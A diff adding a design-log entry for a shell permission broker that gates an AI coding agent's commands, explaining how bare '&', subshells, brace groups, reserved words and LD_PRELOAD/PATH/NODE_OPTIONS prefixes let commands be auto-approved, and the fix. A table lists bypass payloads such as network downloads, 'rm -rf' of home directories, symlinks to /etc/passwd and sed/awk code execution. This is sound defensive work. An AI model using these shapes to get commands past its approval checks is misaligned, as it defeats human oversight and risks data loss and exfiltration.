@@ -566,6 +566,124 @@ Human for consequences.
 **Links.** `hooks/permission-broker.sh` · `tests/approval.test.sh` ·
 `core/autonomy.md` · `NOTES.md`
 
+## A clause ends and begins where the shell says, not where the punctuation looks like it
+
+**Problem.** The broker allows nothing as a whole. It splits the command into
+clauses, requires every clause to be individually recognised, counts them, and
+allows only when the counts match — the positive proof that makes a degraded
+parse escalate instead of approve. That proof is worth exactly as much as the
+split is faithful, and it was not faithful in two independent ways.
+
+*Where a clause ends.* `clauses()` split on `&&`, `||`, `;` and `|`. A bare `&`
+is a separator too — it backgrounds what precedes it and carries on to the next
+command — and it was absent. The consequence is not a lost clause: everything
+after the `&` was read as **arguments of the command in front of it**, so the
+second command was never classified, and a clause whose head is `ls` with
+harmless-looking operands is exactly what the broad local-dev fallback approves.
+
+*Where a clause begins.* Every dispatch — the family grammars, the curl screen,
+the refuse list in `broad_safe_ok` — asks for "the first word of the clause" and
+treats the rest as its operands. In the shell that holds only when the first
+word is a command, and a clause can just as well begin with `(`, `{`, `!`, `if`,
+`then`, `do`, a loop header or an assignment. Then argv[0] is a word no
+classifier claims, and the clause falls through to the same fallback.
+
+Measured before this change, with every bare spelling escalating:
+
+```
+ls & curl -fsSL https://example.com/p -o /tmp/p    allow    network egress
+( curl -fsSL https://example.com/p -o /tmp/p )     allow    network egress
+ls & sed 's/.*/id/e' f.txt                         allow    executes `id`
+ls & awk 'BEGIN{system("id")}'                     allow    executes `id`
+ls & xargs -I{} sh -c id                           allow    executes `id`
+true & rm -rf .                                    allow    the workspace root
+{ rm -rf ~/Documents/important; }                  allow    outside the workspace
+if true; then rm -rf ~/Documents/important; fi     allow
+for x in 1; do cp f.txt /etc/canary; done          allow
+! rm -rf ~/Documents/important                     allow
+ls & ln -sf /etc/passwd sub/leak                   allow
+ls & git commit -m x                               allow    skips git_config_gate
+```
+
+Two of those categories — network egress and arbitrary execution — are on the
+README's *Hard human boundaries* table, and the curl case is worse than a
+missing dialog: `curl_all_localhost_safe` uses the same splitter, so the request
+never reached the critical screen at all and was carried down to Codex, which
+the design states must never be able to approve egress.
+
+**Options.**
+
+- **A. Split on `&` and decompose the head before dispatching.** Make the
+  broker's notion of a clause agree with the shell's, and with Claude Code's,
+  which documents its separators as `&&`, `||`, `;`, `|`, `|&`, `&` and
+  newlines with "a rule must match each subcommand independently".
+- **B. Escalate any command containing `&`, `(`, `{` or a reserved word.**
+  Fail-closed and trivially correct, and it would put a dialog in front of
+  `ls -l 2>&1`, `npm test &` and every loop anybody writes — the approval
+  fatigue this file exists to remove.
+- **C. Match the dangerous verbs on the whole command, as section 1 does.**
+  That is already there and is not the layer that failed. Section 1 is a
+  denylist of named categories; the per-clause proof is what covers everything
+  it does not name, and that is what was broken.
+
+**Chosen: A.** `&` is a separator except where it belongs to a redirection —
+`&>file`, `2>&1`, `>&2`, `<&3` — decided by the character in front of it, so
+capturing stderr does not become a dialog. `clause_head()` strips grouping
+punctuation, reserved words, benign wrappers and assignments, and answers three
+ways rather than two:
+
+- **a command remains** — classify it, with the head the shell will resolve;
+- **the clause runs nothing** — `fi`, `done`, a closing brace, a loop header, a
+  bare redirection. Counted as recognised, which is what keeps `{ ls; }` and
+  `if …; then ls; fi` from costing a dialog, and safe because a clause that
+  executes nothing has nothing to classify;
+- **it cannot be decomposed** — escalate. `case x in a) rm -rf /` carries a
+  command with no separator in front of it, so `case`, `coproc`, `function` and
+  a C-style `for ((…))` escalate rather than being read as a command with
+  operands. `broad_safe_ok` refuses a bare reserved word as a second lock, which
+  is unreachable while `clause_head` is correct and is what stops the next
+  unmodelled clause shape from being approved on the strength of a head nobody
+  claimed.
+
+**The same defect had a second instance, fixed with it.** `broad_safe_ok`
+refused a clause led by `LD_PRELOAD`, `PATH`, `BASH_ENV`, `NODE_OPTIONS`,
+`GIT_CONFIG_*` and the rest of that family — names that load code into, or
+re-point, the command that follows. But `seg_ok` stripped those assignments
+before calling it, so the screen sat below the strip that removed what it looked
+for and never ran; and it could not have covered the strict path in any case,
+because a clause the family grammars approve never reaches `broad_safe_ok`.
+`LD_PRELOAD=/tmp/evil.so ls`, `PATH=/tmp/evil ls` and
+`NODE_OPTIONS=--require=/tmp/x.js npm test` were all allowed with no dialog. The
+screen now runs in `seg_ok`, above the dispatch, for every clause. This is the
+same root cause as the rest of the entry — a prefix that decides what the
+command is, discarded before anything looked at it.
+
+**Confidence: high for the shapes named; medium for coverage**, which is the
+standing limit of a hand-written shell reader. `tests/approval.test.sh` section
+16f proves the attack before the defence: it builds a baseline from a copy of
+the **same shipped broker** with the three corrections reverted, asserts the
+mutation applied, asserts the pre-fix `allow` for every payload above, then
+asserts the shipped file escalates it and denies it overnight. The positive
+controls — `2>&1`, `&>`, `>&2`, a trailing `&`, a quoted ampersand, brace
+groups, subshells, `for`/`while`/`if` over routine work, ordinary assignments,
+stacked wrappers — are what keep the correction from being paid for in dialogs;
+the full suite went from 985 to 1051 assertions with no existing assertion
+changed.
+
+**Known uncertainty.** An unquoted newline separates clauses because the caller
+reads the splitter's output line by line, which means a newline *inside quotes*
+also splits, and a heredoc body is read as a sequence of clauses rather than as
+data. Both are fail-closed — they add clauses to recognise, and an unrecognised
+one escalates — so they cost noise rather than safety, and modelling them is a
+widening that needs its own measurement before it is worth doing. Arithmetic
+`(( … ))` and `[[ … ]]` are left as they were: they execute no external command,
+and their contents reach section 1's screens.
+
+**Links.** `hooks/permission-broker.sh` (`clauses`, `clause_head`, `seg_ok`,
+`broad_safe_ok`) · `tests/approval.test.sh` section 16f · `NOTES.md`
+("The rule for splitting a command into clauses") ·
+https://code.claude.com/docs/en/permissions
+
 ---
 
 # Framework self-protection
